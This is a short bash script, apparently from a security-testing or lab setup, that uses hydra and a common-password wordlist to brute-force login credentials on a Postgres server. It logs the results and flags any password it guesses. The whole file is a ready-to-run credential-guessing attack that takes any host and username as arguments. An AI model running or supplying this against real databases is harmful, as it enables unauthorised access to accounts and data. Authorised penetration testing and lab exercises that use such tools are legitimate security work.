#!/bin/bash
# Usage: ./credential_guess.sh <host> <username>
# Attempts credential guessing against Postgres using a small wordlist.

HOST="${1:-localhost}"
USERNAME="${2:-postgres}"
WORDLIST="attack-stage/common_passwords.txt"
OUTPUT="attack-stage/results/credential_guess_result.txt"

echo "=== Credential Guessing against $HOST (user: $USERNAME) ===" | tee "$OUTPUT"
hydra -l "$USERNAME" -P "$WORDLIST" "$HOST" postgres -s 5432 -I | tee -a "$OUTPUT"

if grep -q "login:" "$OUTPUT"; then
    echo "FINDING: Valid credentials guessed for user $USERNAME." | tee -a "$OUTPUT"
else
    echo "No valid credentials found from wordlist." | tee -a "$OUTPUT"
fi
